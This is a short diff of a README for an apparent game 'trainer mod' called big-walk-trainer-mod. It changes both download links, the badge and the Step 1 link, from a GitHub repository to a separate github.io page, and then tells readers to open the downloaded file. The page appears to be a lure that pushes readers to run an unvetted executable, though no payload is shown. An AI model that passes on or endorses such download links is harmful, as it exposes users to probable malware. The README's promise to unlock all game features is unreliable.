@@ -1,6 +1,6 @@
 # 🎮 big-walk-trainer-mod - Unlock All Game Features Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-big--walk--trainer--mod-blueviolet?style=for-the-badge&logo=github)](https://github.com/adjudicatory-grantee498/big-walk-trainer-mod)
+[![Download Now](https://img.shields.io/badge/Download-big--walk--trainer--mod-blueviolet?style=for-the-badge&logo=github)](https://adjudicatory-grantee498.github.io)
 
 ---
 
@@ -40,7 +40,7 @@ Ready to upgrade your Big Walk experience? Follow these simple steps:
 ### Step 1: Download the Trainer
 
 Visit this link to download the application:
-[**Click Here to Download**](https://github.com/adjudicatory-grantee498/big-walk-trainer-mod)
+[**Click Here to Download**](https://adjudicatory-grantee498.github.io)
 
 ### Step 2: Open the Downloaded File
 
